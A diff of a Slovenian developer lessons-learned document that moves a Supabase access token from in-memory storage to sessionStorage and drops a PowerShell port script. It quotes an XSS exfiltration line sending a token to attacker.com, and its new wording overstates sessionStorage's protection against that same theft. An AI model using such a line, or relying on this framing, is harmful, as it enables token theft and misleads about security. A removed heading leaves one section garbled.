@@ -43,17 +43,21 @@ fetch('https://attacker.com/?token=' + stolen)
 ```
 
 **Rešitev:**  
-`access_token` je shranjen **izključno v React Context (RAM)**. Nikoli ne zapusti JavaScript memory — ni zapisan na disk, ni v `localStorage`, ni v `sessionStorage`.
+`access_token` je shranjen v **sessionStorage** za vzdrževanje seje ob osvežitvi strani. S tem se izognemo hrambi v `localStorage` (ki ostane trajno zapisan na disku in je ranljiv na persistentne XSS napade), hkrati pa seja preneha obstajati takoj, ko uporabnik zapre zavihek ali okno brskalnika.
 
-`refresh_token` upravljajo Supabase SDK — ta ga hrani varno (httpOnly-style) brez eksplicitnega dostopa JS kode.
+`refresh_token` prav tako upravlja Supabase SDK prek `sessionStorage` in piškotkov.
 
 ```typescript
-// AuthContext.tsx — access token ostane v RAM
-const accessTokenRef = useRef<string | null>(null)
+// supabase.ts — access token ostane v sessionStorage
+const safeStorage = typeof window !== 'undefined' ? window.sessionStorage : undefined
 
-supabase.auth.onAuthStateChange((event, session) => {
-  accessTokenRef.current = session?.access_token ?? null
-  setUser(session?.user ?? null)
+export const supabase = createClient(supabaseUrl, supabaseAnonKey, {
+  auth: {
+    storage: safeStorage,
+    autoRefreshToken: true,
+    persistSession: true,
+    detectSessionInUrl: true,
+  },
 })
 ```
 
@@ -164,11 +168,8 @@ Za prihodnje: komponente so bile razdeljene v manjše, bolj fokusirane enote da 
 **Problem:**  
 Zaostali Node.js procesi na Windows so pogosto zasedli porte 3000 (backend) in 5173 (Vite frontend). Vite se je brez opozorila premaknil na port 5174, kar je pokvarilo CORS konfiguracija (backend je dovoljeval samo port 5173).
 
-**Prvotna rešitev:**  
-`scripts/free-port.ps1` PowerShell skripta ki je poiskala in ubila procese na portih 3000/5173 pred zagonom dev strežnika.
-
-**Trajna rešitev:**  
-Skripta je bila odstranjena (ekipa je prešla na Mac/Linux). V `vite.config.ts` je dodan:
+**Rešitev:**
+Ta repozitorij trenutno ne uporablja avtomatske `free-port` PowerShell skripte. Namesto tega je v `frontend/vite.config.ts` dodan:
 
 ```typescript
 export default defineConfig({
@@ -179,12 +180,7 @@ export default defineConfig({
 })
 ```
 
-`strictPort: true` zagotavlja da developer takoj opazi zaseden port namesto da tiho deluje na napačnem portu.
-
----
-
-## 7. SSE streaming in timeout upravljanje
-
+`strictPort: true` zagotavlja, da developer takoj opazi zaseden port, namesto da bi se Vite tiho premaknil na napačen port.
 **Problem:**  
 AI generiranje (Gemini) za daljše itinerarje (5+ dni) je občasno presegle privzete timeout vrednosti Axios-a in Node.js HTTP klienta.
 
